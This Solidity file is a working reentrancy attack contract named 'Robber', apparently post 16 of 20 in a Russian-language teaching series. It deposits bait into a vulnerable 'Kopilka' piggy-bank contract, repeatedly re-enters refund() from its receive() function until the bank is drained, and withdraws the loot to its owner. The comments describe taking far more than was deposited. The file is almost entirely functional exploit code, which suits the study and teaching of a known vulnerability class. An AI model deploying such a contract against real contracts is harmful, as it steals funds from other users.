// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IKopilka {
    function deposit() external payable;
    function refund() external;
}

/// Пост 16/20 — атакующий контракт: реентрабельность
/// Вносим одну долю, а выносим всю копилку — пока она не успела обнулить
/// нашу запись, мы дёргаем refund() снова и снова из receive().
contract Robber {
    IKopilka public immutable target;
    address  public immutable owner;
    uint256  public share; // размер нашей «доли» — сколько уходит за один заход

    constructor(address target_) {
        target = IKopilka(target_);
        owner  = msg.sender;
    }

    // 1) кладём приманку и тут же просим её обратно
    function attack() external payable {
        share = msg.value;
        target.deposit{value: msg.value}();
        target.refund();
    }

    // 2) копилка присылает деньги -> попадаем сюда -> пока есть ещё доля,
    //    заходим в refund() повторно (запись про нас всё ещё не обнулена)
    receive() external payable {
        if (address(target).balance >= share) {
            target.refund();
        }
    }

    // 3) выводим добычу себе
    function loot() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "loot failed");
    }
}
